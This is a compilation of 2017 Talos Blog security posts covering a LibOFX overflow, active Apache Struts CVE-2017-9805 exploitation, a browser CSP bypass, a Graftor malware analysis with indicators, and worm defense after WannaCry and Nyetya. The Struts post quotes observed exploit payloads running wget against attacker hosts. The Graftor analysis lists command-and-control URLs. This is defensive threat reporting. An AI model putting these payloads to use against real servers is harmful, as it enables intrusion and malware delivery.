2017-09-13 22:26:37+08:00,Vulnerability Spotlight: LibOFX Tag Parsing Code Execution Vulnerability,Talos Blog,"This vulnerability was discovered by Cory Duplantis of Talos<br /><br /><h3>Overview</h3><br />LibOFX is an open source implementation of OFX (Open Financial Exchange) an open format used by financial institutions to share financial data with clients. As an implementation of a complex standard,  this library is used by financial software such as GnuCash. Talos has discovered an exploitable buffer overflow in the implementation: a specially crafted OFX file can cause a write out of bounds resulting in code execution. This vulnerability is not currently patched and Talos has not received a response from the developers within the period specified by the <a href=""https://www.cisco.com/c/en/us/about/security-center/vendor-vulnerability-policy.html"">Vendor Vulnerability Reporting and Disclosure Policy</a>.<br /><br /><a name=""more""></a><br /><br /><h3 id=""h.86b4p9aikust"">TALOS-2017-0317 (CVE-2017-2816) - LibOFX Tag Parsing Code Execution Vulnerability</h3><br />Ironically, the vulnerability is located in the way that tags are parsed by the sanitize function. In the function, the tag's names are stored locally on the stack, a too long tag name results in a stack overflow.<br /><br />More details can be found in the vulnerability reports:<a href=""http://www.talosintelligence.com/reports/TALOS-2017-0317"">TALOS-2017-0317</a><br /><br />Tested Version: LibOFX 0.9.11<br /><br /><h2 id=""h.lgggkctha6nd"">Discussion</h2><br />As an open source library, LibOFX may be used in various financial applications. This vulnerability presents many attractive features for attackers. User interaction is not necessarily required to trigger the vulnerability, and any systems presenting with this vulnerability are likely to contain valuable financial information which can be stolen to conduct identity theft, fraud, or easily sold on to other criminals.<br /><br />Organisations may not be aware of the presence of this library being used to parse OFX files in third party software, or in software that has been developed as part of an in-house system. Keeping track of open source libraries used within in-house projects, and quickly applying patches supplied by third party vendors is vital to ensure that vulnerabilities such as these, which are particularly enticing to attackers, are properly managed.<br /><br /><h2 id=""h.beqozwifr92z"">Coverage</h2><div><br /></div>The following Snort Rules will detect exploitation attempts. Note that additional rules may be released at a future date and current rules are subject to change pending additional vulnerability information.

2017-09-08 23:49:47+08:00,Another Apache Struts Vulnerability Under Active Exploitation,Talos Blog,"<i>This post authored by <a href=""https://twitter.com/infosec_nick"">Nick Biasini</a> with contributions from <a href=""https://twitter.com/nschmx"">Alex Chiu</a>.</i><br /><br />Earlier this week, a critical vulnerability in <a href=""https://cwiki.apache.org/confluence/display/WW/S2-052"">Apache Struts</a> was publicly disclosed in a security advisory. This new vulnerability, identified as CVE-2017-9805, manifests due to the way the REST plugin uses XStreamHandler with an instance of XStream for deserialization without any type filtering. As a result, a remote, unauthenticated attacker could achieve remote code execution on a host running a vulnerable version of Apache Struts.<br /><br />This isn't the only vulnerability that has been recently identified in Apache Struts. <a href=""http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html"">Earlier this year</a>,&nbsp;Talos&nbsp;responded&nbsp;to&nbsp;a&nbsp;zero-day&nbsp;vulnerability that&nbsp;was under active exploitation in&nbsp;the&nbsp;wild. Talos has observed exploitation activity targeting CVE-2017-9805 in a way that is similar to how CVE-2017-5638 was exploited back in March 2017.<br /><br /><a name=""more""></a><br /><h3 id=""h.yjfcx7oxvccx"">Details</h3>Immediately after the reports surfaced related to this exploit, Talos began researching how it operated and began work to develop coverage to prevent successful exploitation. This was achieved and we immediately began seeing active exploitation in the wild. Thus far, exploitation appears to be primarily scanning activity, with outbound requests that appear to be identifying systems that are potentially vulnerable. Below is a sample of the type of HTTP requests we have been observing.<br /><blockquote class=""tr_bq"">&lt;string&gt;/bin/sh&lt;/string&gt;&lt;string&gt;-c&lt;/string&gt;&lt;string&gt;wget -qO /dev/null http://wildkind[.]ru:8082/?vulnerablesite&lt;/string&gt;</blockquote>This would initiate a wget request that would write the contents of the HTTP response to /dev/null. This indicates it is purely a scanning activity that identifies to the remote server which websites are potentially vulnerable to this attack. This is also a strong possibility since it includes the compromised website in the URL. There was one other small variation that was conducting a similar request to the same website.<br /><blockquote class=""tr_bq"">&lt;string&gt;/bin/sh&lt;/string&gt;&lt;string&gt;-c&lt;/string&gt;&lt;string&gt;wget -qO /dev/null http://wildkind[.]ru:8082/?`echo ...vulnerablesite...`&lt;/string&gt;</blockquote>During our research we found that the majority of the activity was trying to POST to the path of /struts2-rest-showcase/orders/3. Additionally most of the exploitation attempts are sending the data to wildkind[.]ru, with a decent amount of the requests originating from the IP address associated with wildkind[.]ru, 188.120.246[.]215.<br /><br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://2.bp.blogspot.com/-43pwp2mOpHE/WbHJQlk9djI/AAAAAAAABTo/cc3B9_qI3U4-sU6F-Eq3Rf2MsdlzqJB8wCLcBGAs/s1600/image2.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""346"" src=""https://2.bp.blogspot.com/-43pwp2mOpHE/WbHJQlk9djI/AAAAAAAABTo/cc3B9_qI3U4-sU6F-Eq3Rf2MsdlzqJB8wCLcBGAs/s640/image2.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Example of in the wild exploitation</td></tr></tbody></table>Other exploitation attempts have been identified where Talos believes another threat actor appears to be exploiting the vulnerability for a different purpose. An example of the web requests found in the exploitation attempts can be found below.<br /><blockquote class=""tr_bq"">&lt;string&gt;wget&lt;/string&gt;&lt;string&gt;hxxp://st2buzgajl.alifuzz[.]com/052&lt;/string&gt;</blockquote>Unfortunately, we were unable to retrieve the potentially malicious file that was being served at this particular location. If the previous Struts vulnerability is any indicator, the payloads could vary widely and encompass threats such as DDoS bots, spam bots, and various other malicious payloads.<br /><br /><h3 id=""h.1teoyjf4qh2n"">IOCs</h3>IP Addresses Observed: <br /><ul><li>188.120.246[.]215</li><li>101.37.175[.]165</li><li>162.158.182[.]26</li><li>162.158.111[.]235</li><li>141.101.76[.]226</li><li>141.101.105[.]240</li></ul>Domains Contacted:<br /><ul><li>wildkind[.]ru</li><li>st2buzgajl.alifuzz[.]com</li></ul>Commonly Used Path:<br /><ul><li>/struts2-rest-showcase/orders/3</li></ul><h3 id=""h.yv6ldyfuky10"">Mitigation</h3>Apache has released a new version of Struts that resolves this issue. If you believe that you have a potentially vulnerable version of Apache struts there are two options: upgrade to Struts 2.5.13 / Struts 2.3.34 or remove the REST plugin if it's not actively being used.  Instructions to achieve this are provided as part of the <a href=""https://cwiki.apache.org/confluence/display/WW/S2-052"">security bulletin</a> and should be reviewed and tested before applying in a production environment. In the event it's not possible to upgrade or remove the REST plugin, limiting it to server normal pages and JSONs may help limit the risk the compromise.<br /><h3 id=""h.dp04v9qgtelp"">Conclusion</h3>This is the latest in a long line of vulnerabilities that are exposing servers to potential exploitation. In today's threat landscape a lot of attention is paid to endpoint systems being compromised, and with good reason, as it accounts for the majority of the malicious activity we observe on a daily basis. However, that does not imply that patching of servers should not be an extremely high priority. These types of systems, if compromised, can potentially expose critical data and systems to adversaries.<br /><br />The vulnerability is yet another example of how quickly miscreants will move to take advantage of these types of issues.  Within 48 hours of disclosure we were seeing systems activity exploiting the vulnerability. To their credit the researchers disclosed the vulnerability responsibly and a patch was available before disclosure occurred. However, with money at stake bad guys worked quickly to reverse engineer the issue and successfully develop exploit code to take advantage of it. In today's reality you no longer have weeks or months to respond to these type of vulnerabilities, it's now down to days or hours and every minute counts. Ensure you have protections in place or patches applied to help prevent your enterprise from being impacted.<br /><h3 id=""h.myaej86w3pvi"">Coverage</h3>Talos has released the following Snort rule to address this vulnerability.

2017-09-08 05:05:13+08:00,"Vulnerability Spotlight: Content Security Policy bypass in Microsoft Edge, Google Chrome and Apple Safari",Talos Blog,"The vulnerabilities were discovered by Nicolai Gr&oslash;dum of Cisco.<br /><br />Today, Talos is releasing details of vulnerabilities discovered in Microsoft Edge browser as well as older versions of Google Chrome (<a href=""https://chromereleases.googleblog.com/2017/03/stable-channel-update-for-desktop.html"">CVE-2017-5033</a>) and browsers based on the Webkit such as Apple Safari (<a href=""https://support.apple.com/en-ca/HT207600"">CVE-2017-2419</a>) . An attacker may be able to exploit the vulnerabilities and bypass the Content Security Policy set by the server which may lead to disclosure of confidential information. Microsoft stated that this is by design and has declined to patch this issue. <a name=""more""></a><br /><br /><h3 id=""h.wtl7h8em48en"">Overview</h3><div><br /></div>One of the fundamental security mechanisms of a web application is the so called same-origin policy, prescribing which resources may be accessed by the application code. The essence of the same-origin policy is that it allows programmatic access to web resources only to the code that originates from the same server as the data that is being accessed. <br /><br />For example, a script, executing within the context of a web browser, originating from the server good.example.com should be able to access data from the same server. On the other hand, a script originating from the server evil.example.com should not be able to access any data on good.example.com.<br /><br />However, many vulnerabilities in web applications allowing the attacker to bypass the same-origin policy have been discovered. One particularly successful attack technique is <a href=""https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)"">Cross Site Scripting</a> (XSS). XSS allows the attacker to inject remote code within the context of the original server code executing in the browser. To the browser, the injected code would appear to originate from the same server as the legitimate application therefore allowing access to local resources that can lead to the leak of potentially confidential data to the attacker or even application session hijacking. <br /><br /><a href=""https://www.w3.org/TR/2012/CR-CSP-20121115/"">Content Security Policy</a> (CSP) is a mechanism designed to prevent XSS attacks by whitelisting servers that may be used as legitimate sources for the client side web application code. Cisco researchers have found a way to bypass the Content Security Policy and allow attackers to exploit the issue and potentially disclose confidential data by injecting otherwise excluded code.<br /><h3 id=""h.hyi3fl44doli"">Technical details - Talos-2017-0306 (CVE-2017-2419, CVE-2017-5033)</h3><br />CSP defines the Content-Security-Policy HTTP header that allows creation of a whitelist of sources and instructs the browser to only execute resources from the allowed sources specified by the policy. Even if an attacker finds a way to inject a malicious script and successfully launch a XSS attack by injecting a &lt;script&gt; tag with a remote script source, the remote source will not be matched by the list of allowed sources and will not be executed by the browser.<br /><br />The Content-Security-Policy HTTP header defines the script-src directive which configures CSP for script code. For example, the line <br /><br /><code>Content-Security-Policy: script-src 'self' https://good.example.com</code><br /><br />allows scripts to be loaded only from the server the browser is currently visiting and an additional server good.example.com. <br /><br />However, an information disclosure vulnerability exists within Microsoft Edge (not patched as of version 40.15063)), Google Chrome (patched) and Safari (patched). An attacker may be able to bypass the policy specified by the Content-Security-Policy header, causing an information leak. <br /><br />There are three main components to an exploitation attempt: setting the Content-Security-Policy for the browser with ""unsafe-inline"" directive to allow for inline script code, then using window.open() to open a blank new window, and finally calling the document.write function to write code into the newly created blank window object in order to bypass CSP restrictions put on the document.<br /><br />The issue, affecting the Microsoft Edge browser as well as older versions of Google Chrome and Safari is that about:blank page has the same origin as its loading document, but with the CSP restrictions removed which allows for a successful exploitation. <br /><br />More information about these vulnerabilities is available in the TALOS vulnerability report <a href=""http://www.talosintelligence.com/reports/TALOS-2017-0306/"">TALOS-2017-0306</a>.<br /><h3 id=""h.1jnf2m1x78fz"">Discussion</h3><div><br /></div>Information disclosure vulnerabilities may not be as serious as the vulnerabilities allowing the attacker to launch remote code and escape the browser sandbox to access and control the system under attack. <br /><br />However, XSS attacks that may allow an attacker to exfiltrate confidential data and even take over a user account are considered a serious issue. Content Security Policy is specifically designed with XSS attack prevention in mind and allows the server to whitelist trusted resources that are trusted to be safely executed by a web browser.<br /><br />Many developers rely on CSP to protect them from XSS and other information disclosure attacks and trust browsers to support the standard. However, it seems that the implementation of CSP within different web browsers differs, allowing attackers to write browser specific code to bypass the content security policy defining the source of the allowed code. <br /><br />Users are recommended to use browsers with more complete support for the Content security policy mechanism as well as browsers that keep up to date with all newly discovered security vulnerabilities, including information disclosure vulnerabilities such as the ones described in this post.<br /><h3 id=""h.41nuhcases72"">Affected versions</h3><div><br /></div>Microsoft Edge (not patched as of version 40.15063)<br /><br />Google Chrome prior to version 57.0.2987.98 - (CVE-2017-5033)<br /><br />iOS prior to version 10.3 - (CVE-2017-2419)<br /><br />Apple Safari prior to version 10.1 - (CVE-2017-2419)<br /><h3 id=""h.qkzvaf12pu0"">Coverage</h3><div><br /></div>The following Snort Rules will detect exploitation attempts.

Complicating the matter is that the std library is included rather than dynamically linked, so the analyst doesn’t get dll calls as hints.<br />Further on, this 3rd stage is protected by another anti-debugging technique: the sample registers a VectoredExceptionHandler for FirstChanceExceptions (C0000005) as you can see in Fig. 26 and 27:<br /><br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://1.bp.blogspot.com/--rkEOkAOB_w/Wa7QMut5HmI/AAAAAAAAAxI/NQ48jPvgCjYiWpD7P2MRr6V5frY4lT6jQCLcBGAs/s1600/26.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""42"" src=""https://1.bp.blogspot.com/--rkEOkAOB_w/Wa7QMut5HmI/AAAAAAAAAxI/NQ48jPvgCjYiWpD7P2MRr6V5frY4lT6jQCLcBGAs/s640/26.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Fig. 26</td></tr></tbody></table><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://3.bp.blogspot.com/-EImvwkBCVIY/Wa7QXpyfd1I/AAAAAAAAAxM/q-bDcETNnMQRF7XAFayYxYnyLXcnyFYXwCLcBGAs/s1600/27.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""290"" src=""https://3.bp.blogspot.com/-EImvwkBCVIY/Wa7QXpyfd1I/AAAAAAAAAxM/q-bDcETNnMQRF7XAFayYxYnyLXcnyFYXwCLcBGAs/s640/27.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Fig. 27</td></tr></tbody></table><br /><div style=""text-align: left;"">Then it marks the code section as PAGE_NOACCESS.<br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://2.bp.blogspot.com/-xOw7SUSrYZo/Wa7QlyiiEgI/AAAAAAAAAxQ/wPhqGU7ZFp8djUXAPoZMxH4hyyz8dI1wgCLcBGAs/s1600/28a.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""50"" src=""https://2.bp.blogspot.com/-xOw7SUSrYZo/Wa7QlyiiEgI/AAAAAAAAAxQ/wPhqGU7ZFp8djUXAPoZMxH4hyyz8dI1wgCLcBGAs/s640/28a.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Fig. 28a</td><td class=""tr-caption"" style=""text-align: center;""><br /></td></tr></tbody></table></div><div style=""text-align: left;""><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://3.bp.blogspot.com/-hfuAySiVl1w/Wa7QwLl0mPI/AAAAAAAAAxU/MZxgIn41Cv8ItzaB-UmFNtqFgm1Uq7xCQCLcBGAs/s1600/28b.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""26"" src=""https://3.bp.blogspot.com/-hfuAySiVl1w/Wa7QwLl0mPI/AAAAAAAAAxU/MZxgIn41Cv8ItzaB-UmFNtqFgm1Uq7xCQCLcBGAs/s640/28b.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Fig. 28b</td></tr></tbody></table><br />This means an exception is triggered for every single instruction in this section. The exception handler function (see Fig. 27 above) overwrites the PAGE_NOACCESS access right for the memory location which caused the exception, with a PAGE_EXECUTE_READWRITE, so it can be executed. Then the exception handler function returns to the initial instruction, it can now be executed, but the next instruction is still protected by PAGE_NOACCESS and will cause the next exception. With a debugger attached, this interrupts the debugging session for every instruction. Even if the exceptions are directly passed back to the executable, it massively slows down the execution speed.</div><div style=""text-align: left;"">At 004BB3FA the software starts preparing the internet request to the CnC server and encrypts the collected information to perform a GET request (Fig. 29a-c):</div><div style=""text-align: left;""><br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://2.bp.blogspot.com/-FqPdf4pIKHE/Wa7RDy3BVaI/AAAAAAAAAxY/RQxZxCwd6-c6GNvUAEvbJqvgVqZJUXx3ACLcBGAs/s1600/29a.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""82"" src=""https://2.bp.blogspot.com/-FqPdf4pIKHE/Wa7RDy3BVaI/AAAAAAAAAxY/RQxZxCwd6-c6GNvUAEvbJqvgVqZJUXx3ACLcBGAs/s640/29a.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Fig. 29a</td></tr></tbody></table><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://1.bp.blogspot.com/-zr5GFwsOi-Y/Wa7RD0u2VhI/AAAAAAAAAxc/I3kqzEZGHJAiZE72sXooTHtUeao3tYqRgCEwYBhgL/s1600/29b.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""80"" src=""https://1.bp.blogspot.com/-zr5GFwsOi-Y/Wa7RD0u2VhI/AAAAAAAAAxc/I3kqzEZGHJAiZE72sXooTHtUeao3tYqRgCEwYBhgL/s640/29b.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Fig. 29b</td></tr></tbody></table></div><div style=""text-align: left;""><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://1.bp.blogspot.com/-7Z3vEw0rvTQ/Wa7RD4Gp1CI/AAAAAAAAAxg/Rgj26rQOaf4Nz8H0y6o0_czf-x5Zc_CwACEwYBhgL/s1600/29c.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""74"" src=""https://1.bp.blogspot.com/-7Z3vEw0rvTQ/Wa7RD4Gp1CI/AAAAAAAAAxg/Rgj26rQOaf4Nz8H0y6o0_czf-x5Zc_CwACEwYBhgL/s640/29c.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Fig. 29c</td></tr></tbody></table></div><div style=""text-align: left;"">Talos has decrypted the GET request that is sent to the CnC server.

Users may be unaware that it is being bundled and executed as part of the freeware installation, since these installation files silently execute Graftor alongside the freeware.<br />Once Graftor is running, it exfiltrates a huge amount of user and machine identifiable information and installs additional potentially-unwanted-applications from its partners. The downloader requests administrative rights on the local machine, with this access, it can do anything it wants to do on the user's machine. <br />Solutions such as AMP for endpoints and AMP on network devices give administrators visibility of when software such as Graftor, and the further packages it downloads, are installed on devices. Similarly, network based detection can identify and block the CnC activity (Snort SID 44214). Thought should be given to blocking access to freeware websites to prevent the download of the Graftor installer. However, much freeware does not come bundled with Graftor and may be of great use to some users.<br />At the end of the day, keep in mind that if the software is free, you might be the product. Anyone using freeware should closely review the EULA before installing it. We know it is painful, but trying to remove this kind of software is likely more painful.</div><div style=""text-align: left;""><br /></div><h3>Coverage<br /></h3><br />Additional ways our customers can detect and block this threat are listed below.<br /><br /><div class=""separator"" style=""clear: both; text-align: center;""><a href=""https://4.bp.blogspot.com/-VBEcK350naE/WV3XgfMyLjI/AAAAAAAAAJQ/Ycf4KrzzH7UUXmPSgZ8BjaZp8YNlz2ZSQCLcBGAs/s1600/image1.png"" style=""clear: left; float: left; margin-bottom: 1em; margin-right: 1em;""><img border=""0"" src=""https://4.bp.blogspot.com/-VBEcK350naE/WV3XgfMyLjI/AAAAAAAAAJQ/Ycf4KrzzH7UUXmPSgZ8BjaZp8YNlz2ZSQCLcBGAs/s1600/image1.png"" /></a></div>Advanced Malware Protection (<a href=""https://www.cisco.com/c/en/us/support/security/amp-firepower-software-license/tsd-products-support-series-home.html"">AMP</a>) is ideally suited to prevent the execution of the malware used by these threat actors.<br /><br /><a href=""https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html"">CWS </a>or <a href=""https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html"">WSA </a>web scanning prevents access to malicious websites and detects malware used in these attacks.<br /><br /><a href=""https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html"">Email Security</a> can block malicious emails sent by threat actors as part of their campaign.<br /><br />The Network Security protection of <a href=""https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html"">IPS </a>and <a href=""https://www.cisco.com/c/en/us/products/security/asa-next-generation-firewall-services/index.html"">NGFW </a>have up-to-date signatures to detect malicious network activity by threat actors.<br /><br /><a href=""https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html"">AMP Threat Grid</a> helps identify malicious binaries and build protection into all Cisco Security products.<br /><br /><a href=""https://umbrella.cisco.com/"">Umbrella</a>, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network<br /><br /><br /><h3 style=""text-align: left;"">IOC</h3><b>Alternate Data Streams(ADS): </b><br />C:\Users\dex\AppData\Local\Temp\2263387661.exe:Zone.Identifier<br />C:\Users\dex\AppData\Local\Temp\QBPO5ppcuhJG.exe:tmp<br />C:\Users\dex\AppData\Local\Temp\2263387661.exe:tmp<br />C:\Users\dex\AppData\Local\Temp\AyWdp7tHPIeU.exe:tmp<br />C:\Windows\System32\regsvr32.exe:Zone.Identifier <br /><br /><b>Hashes:</b><br /><div><div style=""text-align: left;""><i>2263387661.exe</i> (Graftor Dropper)<br />9b9ce661a764d84a4636812e1dfcb03b (MD5)  <br />Fd3ccf65eab21a77d2e440bd23c59d52e96a03a4 (SHA1)<br />41474cd23ff0a861625ec1304f882891826829ed26ed1662aae2e7ebbe3605f2 (SHA256)<br /><br />Dumped 2nd stage:<br />40bde09fc059f205f67b181c34de666b (MD5)<br />99c7627708c4ab1fca3222738c573e7376ab4070 (SHA1)<br />Eefdbe891e35390b84181eabe0ace6e202f5b2a050e800fb8e82327d5e57336d (SHA256)<br /><br />Dumped 3rd stage:<br />1e9f40e70ed3ab0ca9a52c216f807eff (MD5)<br />7c4cd0ff0e004a62c9ab7f8bd991094226eca842 (SHA1)<br />5eb2333956bebb81da365a26e56fea874797fa003107f95cda21273045d98385 (SHA256)<br /><br /><b>URLs: </b>&nbsp;</div><div style=""text-align: left;""><i>Command and Control Server GET Request:</i><br />hxxp://kskmasdqsjuzom[.]regularfood[.]gdn/J/ZGF0YV9maWxlcz0yMyZ0eXBlPXN0YXRpYyZuYW1lPVRlbXAlNUMyMjYzMzg3NjYxLmV4ZSZybmQ9ZTY5NjM5ZjJjYTdlNWNiNDU2ZmYwMDUyN2M2ODBlNDMxMTY0YmFhZGJlZWI3MTI5YjIwZGYzM2M3YzIzNTc1YQ...<br /><br />Set-Cookie: GSID=3746aecf3b94384b9de720158c4e7d88; expires=Sat, 12-Aug-2017 15<br /><br /><i>Command and Control Server POST Request</i><br />hxxp://kskmasdqsjuzom[.]regularfood[.]gdn/J/ZGF0YV9maWxlcz0yMyZ0eXBlPXN0YXRpYyZuYW1lPVRlbXAlNUMyMjYzMzg3NjYxLmV4ZSZybmQ9ZTY5NjM5ZjJjYTdlNWNiNDU2ZmYwMDUyN2M2ODBlNDMxMTY0YmFhZGJlZWI3MTI5YjIwZGYzM2M3YzIzNTc1YSZkZWxheT0zODk...<br /><br />Set-Cookie: GSID=3746aecf3b94384b9de720158c4e7d88; expires=Sat, 12-Aug-2017 15<br /><br /><b>Domains from sandbox run:</b><br />arolina[.]torchpound[.]gdn<br />binupdate[.]mail[.]ru<br />crl[.]microsoft[.]com<br />dreple[.]com<br />gambling577[.]xyz<br />jvusdtufhlreari[.]twiceprint[.]gdn<br />kskmasdqsjuzom[.]regularfood[.]gdn<br />mentalaware[.]gdn<br />mrds[.]mail[.]ru<br />nottotrack[.]com<br />plugpackdownload[.]net<br />s2[.]symcb[.]com<br />sputnikmailru[.]cdnmail[.]ru<br />ss[.]symcd[.]com<br />xml[.]binupdate[.]mail[.]ru<br /><br /><b>Snort Rules:</b><br />SID 44214</div><div style=""text-align: left;""><br /><br /></div></div></div><div class=""feedflare"">

2017-08-31 23:05:21+08:00,Back to Basics: Worm Defense in the Ransomware Age,Talos Blog,"<i>This post was authored by <a href=""https://www.blogger.com/profile/10442669663667294759"">Edmund Brumaghin</a></i> <br /><br />""Those who cannot remember the past are condemned to repeat it."" - George Santayana<br /><br /><h2>The Prequel</h2><br />In March 2017, Microsoft released a security update for various versions of Windows, which addressed a remote code execution vulnerability affecting a protocol called SMBv1 (MS17-010). As this vulnerability could allow a remote attacker to completely compromise an affected system, the vulnerability was rated ""Critical"" with organizations being advised to implement the security update. Additionally, Microsoft released workaround guidance for removing this vulnerability in environments that were unable to apply the security update directly. At the same time, Cisco released <a href=""http://blog.talosintelligence.com/2017/04/shadow-brokers.html"">coverage</a> to ensure that customers remained protected.<br /><br />The following month, April 2017, a group publishing under the moniker ""TheShadowBrokers"" publicly released several exploits on the internet. These exploits targeted various vulnerabilities including those that were addressed by MS17-010 a month earlier. As is always the case, whenever new exploit code is released into the wild, it becomes a focus of research for both the information security industry as well as cybercriminals. While the good guys take information and use it for the greater good by improving security, cybercriminals also take the code and attempt to find ways to leverage it to achieve their objectives, whether that be financial gain, to create disruption, etc. <br /><a name=""more""></a><br /><h2>Ransomware Worms</h2><br />Computer worms are not a new concept. Worms are different from other malware in that they self-propagate within and between systems; for example, Conficker is a computer worm that used a Windows vulnerability to propagate (MS08-067) and dates back to 2008. In fact, Conficker is still floating around the internet spreading from vulnerable system to vulnerable system almost 10 years later. What the past has taught us is that whenever exploit code is released in the wild for vulnerabilities that are ""wormable"", worms will be created and distributed. While this doesn't happen often, when it does, the impact worms can have around the world is significant. In 2017, we have seen this twice so far. What is new, however, is the use of computer worms to spread ransomware and other destructive malware. Enter WannaCry and Nyetya.<br /><h3>WannaCry</h3><br />Moving forward in time, in May 2017, we saw the introduction of <a href=""http://blog.talosintelligence.com/2017/05/wannacry.html"">WannaCry</a> into the threat landscape. WannaCry was created as a ransomware worm, meaning that it leveraged vulnerabilities in Windows to spread itself and infect additional systems without requiring explicit user interaction. WannaCry leveraged the vulnerability addressed two months prior (MS17-010) to perform this propagation. Once systems were infected, ransomware would be installed and their system would be used to propagate the attack to other systems. This quickly lead to a snowball effect with more and more systems becoming infected and actively attempting to spread the malware. The damage created by WannaCry was global, with many organizations around the world either directly affected due to infections, or indirectly due to issues caused elsewhere by the malware.<br /><h3>Nyetya</h3><br />Fast forwarding to June 2017, a second, more sophisticated <a href=""http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html"">attack</a> leveraged the same vulnerabilities, for which security updates had been released months prior. This particular attack can be labeled as more sophisticated for a number of reasons. First, it leveraged what's known as a ""supply-chain attack"" as the initial <a href=""http://blog.talosintelligence.com/2017/07/the-medoc-connection.html"">vector</a> for compromising organizations. In supply-chain attacks, the attackers take advantage of a trusted relationship between an organization and a vendor or supplier. In this case, the attackers behind Nyetya compromised a software update server used extensively by businesses and organizations in Ukraine. They leveraged the compromised server to deploy backdoored versions of the software under the guise of software updates. Once backdoored, the attackers could distribute their malware directly into the targeted environments. In this particular case, the malware caused significant system impact and leveraged multiple methods for propagating throughout the network in compromised organizations. In a similar fashion to WannaCry, this resulted in many organizations facing significant operational disruption, however in this case, the damage was mainly focused within Ukraine.<br /><br /><h2>WannaCry vs. Nyetya</h2><br />There are significant differences between these two pieces of malware. As previously mentioned, Nyetya can be considered significantly more sophisticated for a number of different reasons, which are detailed in the following sections. One example of the difference in sophistication between these two worms lies in the code itself. WannaCry featured multiple bugs (including a broken scanning function) which might be indicative of differences in the skill level of the attackers who created WannaCry versus those who created Nyetya. The major differences between these two worms can be characterized by how malware was delivered, the methods of propagation used by the malware, as well as the mission objective of the attackers who distributed them. <br /><h3>Delivery</h3><br />The delivery mechanism used by the two malware families was significantly different. WannaCry was simple: find or build a vulnerable SMBv1 server and infect it causing it to scan the internet and propagate. Nyetya was significantly more advanced. The attackers behind the Nyetya worm were able to successfully compromise a server used to distribute software updates for a piece of software used extensively within a specific geographic region. As mentioned in our blog post <a href=""http://blog.talosintelligence.com/2017/07/the-medoc-connection.html"">here</a>, it is possible that the reason the attacker chose to expose, or make known that they had this level of access to systems within the targeted geographic region is due to them having additional comparable capabilities that may be used in the future.<br /><h3>Propagation</h3><br />The propagation mechanisms used by Nyetya, featuring similar capabilities as WannaCry, included several additional methods that were available to Nyetya, and included credential compromise. Rather than simply relying on the SMBv1 vulnerability, Nyetya also featured the ability to leverage PSExec and WMI. Additionally, while WannaCry was programmed to spread across both internal and external networks and contained code level issues with the scanning functionality leading to performance deficiencies, Nyetya only propagated internally within compromised environments. It is possible that this was done to limit the impact of the malware to only the specific region or organizations being targeted.<br /><h3>Mission Objective</h3><br />The suspected mission objectives for both of these cases were also different. With WannaCry, it seems reasonable to conclude that the malware was simply a poorly executed attempt to generate revenue through the mass deployment of ransomware. The inclusion of what is referred to as a ""killswitch"", a single domain designated to control the malware spread, made it easy for security researchers to stop the spread of this malware and indicates how unsophisticated the programmer(s) really were. The attacker's later movement of the bitcoins from the WannaCry bitcoin wallets also seems to further support that hypothesis. With Nyetya, the mission objective appears to have been causing operational disruption within a targeted environment. Nyetya wiping portions of the hard drive of infected systems and providing no mechanism for reversing that process also seems to support this hypothesis.<br /><br /><h2>What Could Have Been Done Differently?</h2><br />Getting back to the basics of information security would have been an effective means of either preventing or seriously limiting the impact of both of these threats. <br /><h3>Patching</h3><br />WannaCry was easily avoidable for most organizations. Simply installing the security update associated with MS17-010 would have prevented a successful WannaCry infection. There have been several arguments made about whether or not this was possible on older systems still being actively used in some organizations. WannaCry's implementation of the exploit code targeting the 